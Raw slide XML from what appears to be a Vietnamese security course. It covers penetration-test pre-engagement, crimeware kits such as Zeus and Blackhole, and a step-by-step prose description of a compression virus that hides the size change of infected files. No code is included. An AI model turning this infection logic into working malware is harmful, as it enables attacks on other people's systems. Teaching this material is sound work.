              <a:t>Các tương tác trước-tương tác thường xảy ra khi bạn thảo luận về phạm vi và các điều khoản của thử nghiệm thâm nhập với khách hàng của bạn. Điều rất quan trọng trong thời gian trước khi cuộc thử nghiệm diễn ra, bạn đưa racam kết các mục tiêu đạt được. Giai đoạn này cũng là hội để bạn nói cho khách hàng của bạn biết về những gì được mong đợi từ một cuộc thâm nhập đầy đủ, toàn diện.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50180" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{73FF2608-3C45-4873-85F1-AD4C3B8AD39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8AFF7F3-FC98-46F8-9E1B-B944612F940D}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr/>
              <a:t>33</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39893038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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E84C4D02-1EA2-4102-90EF-8AE9095E359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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D63954FC-2B71-47B3-A56B-A7FC5FFD68E2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="1100" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Các tương tác trước-tương tác thường xảy ra khi bạn thảo luận về phạm vi và các điều khoản của thử nghiệm thâm nhập với khách hàng của bạn. Điều rất quan trọng trong thời gian trước khi cuộc thử nghiệm diễn ra, bạn đưa racam kết các mục tiêu đạt được. Giai đoạn này cũng là hội để bạn nói cho khách hàng của bạn biết về những gì được mong đợi từ một cuộc thâm nhập đầy đủ, toàn diện.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50180" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{73FF2608-3C45-4873-85F1-AD4C3B8AD39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8AFF7F3-FC98-46F8-9E1B-B944612F940D}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr/>
              <a:t>34</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7040507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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E84C4D02-1EA2-4102-90EF-8AE9095E359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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D63954FC-2B71-47B3-A56B-A7FC5FFD68E2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="1100" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Các tương tác trước-tương tác thường xảy ra khi bạn thảo luận về phạm vi và các điều khoản của thử nghiệm thâm nhập với khách hàng của bạn. Điều rất quan trọng trong thời gian trước khi cuộc thử nghiệm diễn ra, bạn đưa racam kết các mục tiêu đạt được. Giai đoạn này cũng là hội để bạn nói cho khách hàng của bạn biết về những gì được mong đợi từ một cuộc thâm nhập đầy đủ, toàn diện.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50180" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{73FF2608-3C45-4873-85F1-AD4C3B8AD39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8AFF7F3-FC98-46F8-9E1B-B944612F940D}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr/>
              <a:t>35</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9120903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TextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="457200" y="720725"/>
            <a:ext cx="6400800" cy="360045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buFontTx/>
              <a:buNone/>
            </a:pPr>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TextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="457200" y="720725"/>
            <a:ext cx="6400800" cy="360045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buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40834039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Tìm hiểu một số kit crimeware: Zeus, Sakura, Blackhole, Phoenix… </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Virus-creation toolkits </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>xuất hiện từ những năm 1990s</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Attack kits những năm 2000s</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>42</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8707842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8F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>44</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="202038614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virus: xuất hiện từ những năm 1980s</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>45</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40644410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8F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>47</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35848345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a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>M</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ã vi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>rus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, V, được thêm vào các chương trình bị nhiễm và giả định rằng điểm nhập vào chương trình, khi được gọi, là dòng đầu tiên của chương trình. Một chương trình bị nhiễm bắt đầu bằng mã </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>virus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>và hoạt động như sau. Dòng đầu tiên của mã là một bước nhảy vào chương trình virus chính. Dòng thứ hai là một điểm đánh dấu đặc biệt được sử dụng bởi virus để xác định liệu một chương trình nạn nhân có tiềm năng đã bị nhiễm virus này hay không. Khi chương trình được gọi, kiểm soát ngay lập tức chuyển sang chương trình virus chính. Chương trình virus đầu tiên tìm kiếm các tệp thực thi không bị nhiễm và lây nhiễm chúng. Tiếp theo, vi rút có thể thực hiện một số hành động, thường gây bất lợi cho hệ thống. Hành động này có thể được thực hiện mỗi khi chương trình được gọi, hoặc nó có thể là một quả bom logic mà chỉ gây ra trong điều kiện nhất định. Cuối cùng, virus truyền kiểm soát sang chương trình gốc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>48</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9583484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vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Một </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>virus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> như mô tả </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>có thể dễ dàng phát thiện </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>vì một phiên bản bị nhiễm của một chương trình</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> sẽ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> dài hơn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> bản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> không bị nhiễm bệnh. Một cách để ngăn chặn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>cách phát hiện đơn giản này</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> là nén tệp tin thực thi để cả các phiên bản bị nhiễm và không nhiễm đều có cùng độ dài. Mã số thể hiện trong hình</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>cho thấy các yêu cầu logic nói chung. Các dòng chính trong virus này được đánh số, và ở dưới minh họa hoạt động. Trong ví dụ này, virus không làm gì khác hơn là </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>lây nhiễm. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Như trong ví dụ trước, virus có thể bao gồm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>logic bomb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>giả định rằng chương trình P1 bị nhiễm virus CV. Khi chương trình này được triệu gọi, điều khiển sẽ chuyển sang </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>virus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, thực hiện các bước sau:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Đối với mỗi tệp P2 không lây nhiễm được tìm thấy, virus đầu tiên nén tệp tin đó để sản xuất, ngắn hơn chương trình gốc do kích thước của v</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>us</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200">
              <a:solidFill>
                <a:schemeClr val="accent2"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>2. Một bản sao của virus được thêm vào trước cho chương trình nén.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200">
              <a:solidFill>
                <a:schemeClr val="accent2"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3. Phiên bản nén của chương trình gốc bị nhiễm,, không</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>nén.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200">
              <a:solidFill>
                <a:schemeClr val="accent2"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>4. Chương trình ban đầu không nén được thực thi.</a:t>
            </a:r>
